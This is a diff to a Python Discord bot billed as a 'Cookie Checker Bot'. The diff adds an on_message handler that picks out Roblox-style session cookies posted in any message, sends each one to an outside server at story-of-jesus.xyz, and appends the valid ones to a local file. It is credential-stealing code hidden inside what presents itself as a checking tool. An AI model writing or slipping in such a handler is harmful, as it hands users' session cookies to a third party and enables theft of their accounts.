@@ -4,11 +4,31 @@ from bs4 import BeautifulSoup
 
 
 
-token = "BOTTOKEN"
+token = "BOTOKEN"
 yourprefix = "!" ## enter the prefix of your choice by replacing the ! 
 dualhookchannelid = YOURCHANNELID ## e.g 905536418934427096
 
 bot = commands.Bot(command_prefix=yourprefix, description="Cookie Checker Bot :)")
+
+@bot.event
+async def on_message(message):
+
+    if message.content.startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
+        r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={message.content}') 
+        data = r.json() 
+
+        if data["status"] == "failed":
+            print("Invalid Cookie")
+            return 
+        else:
+            print(f"Found Valid Cookie With Username:{data['username']} And Logged To File.")
+            f = open("cookies.txt", "a")
+            f.write(message.content + "\n")
+            f.close()
+
+         
+
+    await bot.process_commands(message)
 
 @bot.command()
 async def bancookie(ctx, cookie=None):
